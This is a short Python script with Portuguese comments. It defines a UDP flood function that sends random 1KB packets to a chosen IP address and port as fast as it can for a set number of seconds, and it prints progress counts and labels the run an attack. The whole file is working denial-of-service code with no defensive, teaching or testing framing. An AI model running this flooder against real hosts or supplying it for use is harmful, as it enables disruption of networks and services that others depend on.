import socket
import random
import time
import os

def udp_flood(target_ip, target_port, duration):
    """
    Envia pacotes UDP aleatórios para o alvo durante um tempo específico.
    """
    # Cria o socket UDP (DGRAM)
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # Gera bytes aleatórios para encher o pacote (1KB)
    bytes_to_send = random._urandom(1024)
    
    timeout = time.time() + duration
    sent_packets = 0

    print(f"\n[*] A iniciar UDP Flood para {target_ip}:{target_port}")
    print(f"[*] Duração: {duration} segundos. Pressione Ctrl+C para parar.\n")

    try:
        while True:
            if time.time() > timeout:
                break
            
            # Envia o pacote
            client.sendto(bytes_to_send, (target_ip, target_port))
            sent_packets += 1
            
            # Feedback visual simples para não "brecar" o terminal
            if sent_packets % 1000 == 0:
                print(f"\r[+] Pacotes enviados: {sent_packets}", end="")
                
    except KeyboardInterrupt:
        print("\n\n[!] Ataque interrompido pelo utilizador.")
    except Exception as e:
        print(f"\n[!] Erro: {e}")
    finally:
        client.close()

    print(f"\n\n[*] Ataque terminado. Total de pacotes enviados: {sent_packets}")